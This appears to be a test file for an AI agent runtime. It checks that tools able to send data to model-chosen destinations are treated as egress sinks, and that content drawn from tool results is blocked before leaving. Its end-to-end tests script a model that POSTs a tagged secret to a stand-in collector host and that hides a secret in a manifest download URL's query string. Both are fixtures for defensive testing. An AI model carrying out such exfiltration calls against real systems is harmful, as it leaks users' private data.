/**
 * 0.7.1 — permission-integration#5: every builtin that sends to a place the
 * model chose is a dynamic egress sink, so content from a tool result, an MCP
 * server or a sub-agent reaching it is BLOCKED, as it is for Fetch.
 *
 * `defaultSinkScope` reads the tool's declaration (`hasModelChosenDestination`:
 * external, with a `url` or `recipient` operative field) instead of a list of
 * names. This checks the result over the live registry, the sinks the audit
 * named, and one of them end to end through the run loop.
 */
import { beforeAll, describe, expect, test } from "bun:test";
import type { ProviderAdapter } from "@crewhaus/adapter-anthropic";
import type { EgressMatcher } from "@crewhaus/egress-classifier";
import { type TrustOrigin, createRunContext } from "@crewhaus/run-context";
import { defaultSinkScope, runChatLoop } from "@crewhaus/runtime-core";
import { type RegisteredTool, hasModelChosenDestination } from "@crewhaus/tool-catalog";
import { _setFetch as _setDistributionFetch } from "@crewhaus/tool-distribution";
import type { TraceEvent } from "@crewhaus/trace-event-bus";
import { loadAllBuiltinTools } from "./builtin-tools-for-tests";

type Loaded = { readonly tool: RegisteredTool; readonly pkg: string };
let external: ReadonlyArray<Loaded>;
beforeAll(async () => {
  const { tools, packageOf } = await loadAllBuiltinTools();
  external = tools
    .filter((tool) => tool.scope === "external")
    .map((tool) => ({ tool, pkg: packageOf.get(tool.name) ?? "?" }));
}, 60_000);

const scopeOf = (name: string) => {
  const found = external.find((e) => e.tool.name === name)?.tool;
  if (found === undefined) throw new Error(`no external builtin named ${name}`);
  return defaultSinkScope(found.name, found);
};

describe("which builtins are dynamic sinks", () => {
  test("the sinks the audit found warning where Fetch blocks now block", () => {
    for (const name of [
      "Fetch",
      "WebFetch",
      "HttpRequest",
      "HttpBatch",
      "GraphqlQuery",
      "WebhookPost",
      "EmailSend",
      "SmsSend",
      "PushNotify",
      "ChatPost",
      "IssueComment",
      "DownloadFile",
      "OpenExternal",
      "HttpPaginate",
      "EvmGetBlock",
      // The URLs it downloads are written inside the manifest text (C049).
      "PackageManifestVerify",
    ]) {
      expect({ name, scope: scopeOf(name) }).toEqual({ name, scope: "external-dynamic" });
    }
  });

  test("fixed-destination sinks stay configured", () => {
    for (const name of [
      "WebSearch",
      "ImageGenerate",
      // A command line names no destination field; classifying the shell as
      // dynamic would block every command that mentions a file it was shown.
      "Bash",
      "RunCommand",
      "IssueGet",
      "GitStatus",
      "SendMessage",
    ]) {
      expect({ name, scope: scopeOf(name) }).toEqual({ name, scope: "external-configured" });
    }
  });

  test("the dynamic set is the declared one, and it is not small", () => {
    // Hit count for the derivation: every external builtin with a url or
    // recipient operative argument, which is what defaultSinkScope reads.
    const dynamic = external.filter(({ tool }) => hasModelChosenDestination(tool));
    expect(dynamic.length).toBeGreaterThanOrEqual(45);
    for (const { tool } of dynamic) {
      expect({ name: tool.name, scope: defaultSinkScope(tool.name, tool) }).toEqual({
        name: tool.name,
        scope: "external-dynamic",
      });
    }
  });

  /**
   * The audit's suggested guard: an external tool with a field named like a
   * destination must declare it, so the classification above cannot miss it.
   * The exemptions are fields whose destination the operator fixes, each
   * with the reason; the test fails if one stops being used.
   */
  const DESTINATION_FIELD = /^(url|urls|rpcUrl|baseUrl|apiBaseUrl|to|target|peers|host|endpoint)$/;
  const OPERATOR_FIXED: Readonly<Record<string, string>> = {
    "@crewhaus/tool-codehost#baseUrl":
      "an API root whose origin must be allow-listed; the tool writes every path itself",
    "@crewhaus/tool-codehost#host": "the API dialect, github or gitlab, not a place",
    "@crewhaus/tool-notify#apiBaseUrl":
      "an API root whose origin must be allow-listed; the channel is the declared destination",
    "@crewhaus/tool-notify#host":
      "the SMTP relay, which must be in allowed_smtp_hosts; the recipients are declared",
    "@crewhaus/tool-fleet#target": "a compile target name, not a place",
  };

  test("an external tool with a destination-shaped field declares it", () => {
    const undeclared: string[] = [];
    const exemptionsUsed = new Set<string>();
    let checked = 0;
    for (const { tool, pkg } of external) {
      const shape = (tool.inputSchema as { shape?: Record<string, unknown> }).shape ?? {};
      const declared = new Set((tool.operativeArgs ?? []).map((a) => a.field.split(".")[0]));
      for (const field of Object.keys(shape)) {
        if (!DESTINATION_FIELD.test(field)) continue;
        checked++;
        if (declared.has(field)) continue;
        const key = `${pkg}#${field}`;
        if (Object.hasOwn(OPERATOR_FIXED, key)) {
          exemptionsUsed.add(key);
          continue;
        }
        undeclared.push(`${tool.name}.${field}`);
      }
    }
    // The sweep's hit count, and every exemption still earns its place.
    expect(external.length).toBeGreaterThanOrEqual(150);
    expect(checked).toBeGreaterThanOrEqual(40);
    expect([...exemptionsUsed].sort()).toEqual(Object.keys(OPERATOR_FIXED).sort());
    expect(undeclared).toEqual([]);
  });

  /**
   * The field-name guard above cannot see a destination carried INSIDE a
   * value: PackageManifestVerify dials every URL written in a manifest's
   * text, and no field of it is named like a URL (C049). So every external
   * tool that reaches the network is held here too: it is a dynamic sink
   * (it declares a `url` or `recipient`), or it is listed with where its
   * destination comes from instead. A new network tool fails until it is one
   * or the other, which is the review that would have caught
   * PackageManifestVerify.
   */
  const CODE_HOST =
    "the configured code host, at an allow-listed origin; the call names a repository there";
  const CHAIN_RPC =
    "the RPC endpoint the operator configured for the chain; the call names what to read there";
  const CONFIGURED_DESTINATION: Readonly<Record<string, string>> = {
    AlertAck: "the operator's configured alerting backend",
    AlertList: "the operator's configured alerting backend",
    ChatDelete: "a message already posted, in the configured chat workspace; it sends no text",
    ChatReact: "a message already posted, in the configured chat workspace; it sends an emoji name",
    CheckRuns: CODE_HOST,
    CompareRefs: CODE_HOST,
    ContractInspect: CHAIN_RPC,
    DefiPositionRead: CHAIN_RPC,
    DeliveryCheck: "the configured notification provider's delivery status",
    EntityRegistryLookup: "fixed public company registries",
    Erc20Balance: CHAIN_RPC,
    EvmBlockNumber: CHAIN_RPC,
    EvmCall: CHAIN_RPC,
    EvmGetBalance: CHAIN_RPC,
    EvmGetLogs: CHAIN_RPC,
    EvmGetTransaction: CHAIN_RPC,
    EvmGetTransactionReceipt: CHAIN_RPC,
    EvmMulticall: CHAIN_RPC,
    EvmSimulate: CHAIN_RPC,
    EvmSimulateBundle: CHAIN_RPC,
    GasMarketRead: CHAIN_RPC,
    ImageGenerate: "the configured image provider",
    IssueGet: CODE_HOST,
    IssueList: CODE_HOST,
    LogsQuery: "the operator's configured log backend",
    MetricsQuery: "the operator's configured metrics backend",
    OraclePriceRead: CHAIN_RPC,
    PortfolioValuation: `${CHAIN_RPC}, and fixed public price providers`,
    PrComments: CODE_HOST,
    PrFiles: CODE_HOST,
    PrGet: CODE_HOST,
    PrList: CODE_HOST,
    PrReviews: CODE_HOST,
    PreflightRun: "binds local ports to see whether they are free; sends nothing anywhere",
    PriceQuote: "fixed public price providers (the ECB, Coinbase)",
    RateLimitStatus: CODE_HOST,
    RegistryOutdated: "fixed public package registries (npm, PyPI, crates.io)",
    RegistryPackageInfo: "fixed public package registries (npm, PyPI, crates.io)",
    RegistrySearch: "fixed public package registries (npm, PyPI, crates.io)",
    ReleaseGet: CODE_HOST,
    ReleaseList: CODE_HOST,
    RepoGet: CODE_HOST,
    Retrieve: "the configured embedder and vector store",
    SearchCode: CODE_HOST,
    SearchIssues: CODE_HOST,
    SendMessage: "the operator's configured channel adapter",
    StatusPagePost: "the operator's configured status page",
    TokenResolve: CHAIN_RPC,
    VatIdValidate: "the fixed VIES service",
    VectorDelete: "the configured vector store",
    WebSearch: "the configured search provider",
    WorkflowRunLogs: CODE_HOST,
    WorkflowRunRerun: CODE_HOST,
    WorkflowRuns: CODE_HOST,
  };

  test("a network tool is a dynamic sink, or says where its destination comes from", () => {
    const network = external.filter(({ tool }) => tool.ioCapability === "network");
    const configured = network
      .filter(({ tool }) => !hasModelChosenDestination(tool))
      .map(({ tool }) => tool.name)
      .sort();
    // The sweep's hit count: both halves are populated.
    expect(network.length).toBeGreaterThanOrEqual(100);
    expect(network.length - configured.length).toBeGreaterThanOrEqual(45);
    expect(configured).toEqual(Object.keys(CONFIGURED_DESTINATION).sort());
    for (const name of configured) {
      expect({ name, scope: scopeOf(name) }).toEqual({ name, scope: "external-configured" });
    }
  });
});

describe("end to end: a tool result reaching HttpRequest is blocked", () => {
  function adapter(input: unknown, name = "HttpRequest"): ProviderAdapter {
    let i = 0;
    return {
      providerId: "anthropic",
      features: {
        caching: "explicit",
        tool_use: true,
        vision: true,
        thinking: true,
        web_search: true,
      },
      estimateTokens: () => 0,
      stream: () => {
        const first = i++ === 0;
        return (async function* () {
          yield { kind: "message_start" } as const;
          yield {
            kind: "content_block_start",
            index: 0,
            block: first
              ? { type: "tool_use", id: "tu_1", name, input: {} }
              : { type: "text", text: "" },
          } as const;
          yield {
            kind: "content_block_delta",
            index: 0,
            delta: first
              ? { type: "input_json_delta", partial_json: JSON.stringify(input) }
              : { type: "text_delta", text: "done" },
          } as const;
          yield { kind: "content_block_stop", index: 0 } as const;
          yield {
            kind: "message_delta",
            stopReason: first ? "tool_use" : "end_turn",
            usage: { input: 1, output: 1 },
          } as const;
          yield { kind: "message_stop" } as const;
        })();
      },
    };
  }

  test("the egress verdict is block, and the request is never made", async () => {
    const httpRequest = external.find((e) => e.tool.name === "HttpRequest")?.tool as RegisteredTool;
    let executed = false;
    const spy: RegisteredTool = {
      ...httpRequest,
      execute: async () => {
        executed = true;
        return "sent";
      },
    };
    const runContext = createRunContext();
    runContext.dataLineage = new Map<string, TrustOrigin>([["tool-result-secret-value", "tool"]]);
    const events: TraceEvent[] = [];
    runContext.eventBus.subscribe((e) => events.push(e));
    // Whether the payload carries tagged content is the matcher's call; this
    // one says it does, so the test is about the tier the sink lands in.
    const matcher: EgressMatcher = {
      name: "spy",
      match: () => ({ originsFound: ["tool"], matchCount: 1 }),
    };
    await runChatLoop({
      model: "test-model",
      instructions: "post the report",
      runContext,
      singleTurn: true,
      seedMessages: [{ role: "user", content: "go" }],
      permissionMode: "bypass",
      tools: [spy],
      egressMatcher: matcher,
      _adapter: adapter({
        url: "https://collector.example/in",
        method: "POST",
        body: "tool-result-secret-value",
        justification: "post the report to the collector",
      }),
    });
    const egress = events.find(
      (e): e is Extract<TraceEvent, { kind: "permission_decision" }> =>
        e.kind === "permission_decision" && (e.reason?.startsWith("egress:") ?? false),
    );
    expect(egress?.outcome).toBe("egress-blocked");
    expect(executed).toBe(false);
  });

  test("PackageManifestVerify does not download a URL carrying a tool result's text (C049)", async () => {
    const pmv = external.find((e) => e.tool.name === "PackageManifestVerify")
      ?.tool as RegisteredTool;
    const wire: string[] = [];
    _setDistributionFetch(async (req) => {
      wire.push(req.url);
      return new Response("x", { status: 200 });
    });
    const secret = "internal-doc-7f3a9c Q3 acquisition target";
    const manifest = (query: string) =>
      `class Foo < Formula\n  desc "x"\n  homepage "https://example.com"\n  version "1.0.0"\n  url "https://example.com/foo-1.0.0.tar.gz${query}"\n  sha256 "${"a".repeat(64)}"\nend\n`;
    const run = async (mode: "plan" | "auto", text: string, download?: boolean) => {
      const runContext = createRunContext();
      runContext.dataLineage = new Map<string, TrustOrigin>([[secret, "tool"]]);
      const events: TraceEvent[] = [];
      runContext.eventBus.subscribe((e) => events.push(e));
      await runChatLoop({
        model: "test-model",
        instructions: "verify the release manifest",
        runContext,
        singleTurn: true,
        seedMessages: [{ role: "user", content: "go" }],
        permissionMode: mode,
        tools: [pmv],
        _adapter: adapter(
          { manifests: [{ text }], ...(download !== undefined ? { download } : {}) },
          "PackageManifestVerify",
        ),
      });
      return events
        .filter((e) => e.kind === "permission_decision")
        .map((e) => (e.kind === "permission_decision" ? (e.outcome ?? e.decision) : ""));
    };
    try {
      for (const mode of ["plan", "auto"] as const) {
        const tagged = manifest(`?d=${encodeURIComponent(secret)}`);
        expect({ mode, outcomes: await run(mode, tagged) }).toMatchObject({
          mode,
          outcomes: expect.arrayContaining(["egress-blocked"]),
        });
      }
      expect(wire).toEqual([]);
      // Control: a manifest carrying nothing a tool returned is not blocked.
      const clean = await run("auto", manifest(""), false);
      expect(clean).not.toContain("egress-blocked");
    } finally {
      _setDistributionFetch(undefined);
    }
  });
});
